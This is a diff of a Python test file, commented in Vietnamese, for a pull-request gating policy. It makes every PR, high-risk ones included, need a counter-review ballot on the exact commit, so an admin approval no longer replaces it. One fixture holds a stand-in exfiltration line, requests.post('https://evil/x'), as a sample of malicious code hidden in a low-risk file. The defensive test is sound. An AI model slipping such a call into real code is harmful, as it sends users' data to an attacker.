@@ -241,7 +241,7 @@ def vua(ds_duyet=None, **khac):
 
 
 class TestPhieuPhanBac(unittest.TestCase):
-    """Luật L3, L4: mọi PR không Cao cần một phiếu phản bác không bác trên đúng SHA (Alex 1a 06/11: bỏ rút thăm)."""
+    """Luật L3, L4: mọi PR, cả mức Cao, cần một phiếu phản bác không bác trên đúng SHA (Alex 1a 06/11)."""
 
     def test_khong_phieu_thi_chan(self):
         q = quyet_dinh(vua())
@@ -284,10 +284,24 @@ class TestPhieuPhanBac(unittest.TestCase):
         self.assertIn("trần L4", q["ly_do"][0])
         self.assertEqual(quyet_dinh(vua(ds + [duyet()]))["ket_luan"], CHO_QUA)
 
-    def test_nguoi_admin_duyet_thay_phieu(self):
-        q = quyet_dinh(vua([duyet()]))
+    def test_admin_duyet_khong_thay_phieu(self):
+        # Alex 1a 06/11: mọi mức cần phiếu. Phiếu phản bác thẻ duyệt: PR Cao kèm mã độc ở tệp Thường, admin duyệt
+        # theo thẻ (thẻ không đưa diff tệp Thường) thì trước đây qua mà không ai đọc phần mã đó.
+        doc = tep("src/app.py", patch="@@ -1 +1 @@\n+requests.post('https://evil/x')")
+        for ds_tep in ([tep()], [tep("package.json"), doc], [tep("src/app.py", 401, 0)]):
+            with self.subTest(ds_tep=[t["filename"] for t in ds_tep]):
+                duyet_co = duyet(body="ngoai-le-co: đã đọc thẻ, đổi lớn có chủ đích")
+                q = quyet_dinh(vua([duyet_co], ds_tep=ds_tep))
+                self.assertEqual(q["ket_luan"], CHAN)
+                self.assertIn("phiếu phản bác", " ".join(q["ly_do"]))
+                self.assertEqual(quyet_dinh(vua([duyet_co, phieu()], ds_tep=ds_tep))["ket_luan"], CHO_QUA)
+
+    def test_cao_tran_l4_admin_quyet(self):
+        ds = [phieu("bac", commit=SHA_CU), phieu("bac", commit="c" * 40)]
+        self.assertEqual(quyet_dinh(vua(ds, ds_tep=CAO))["ket_luan"], CHAN)
+        q = quyet_dinh(vua(ds + [duyet()], ds_tep=CAO))
         self.assertEqual(q["ket_luan"], CHO_QUA)
-        self.assertIn("không cần phiếu phản bác", " ".join(q["chi_tiet"]))
+        self.assertIn("trần L4", " ".join(q["chi_tiet"]))
 
     def test_nguoi_khong_co_quyen_ghi_khong_ghi_duoc_phieu(self):
         self.assertEqual(quyet_dinh(vua([phieu(user="nguoi-la")]))["ket_luan"], CHAN)
